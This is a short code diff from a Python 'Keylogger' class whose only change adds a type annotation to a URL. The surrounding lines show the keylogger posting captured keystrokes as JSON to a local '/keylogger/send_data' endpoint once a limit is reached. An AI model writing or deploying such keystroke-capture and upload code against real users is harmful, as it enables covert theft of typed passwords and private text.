@@ -49,7 +49,7 @@ class Keylogger:
         self._pressed[character] = True
 
         if len(self._keys_pressed) >= SAVED_KEYS_LIMIT:
-            url = "http://127.0.0.1:5000/keylogger/send_data"
+            url: Final[str] = "http://127.0.0.1:5000/keylogger/send_data"
             response: dict = requests.post(url, json=self._to_json())
             self._keys_pressed.clear()
 
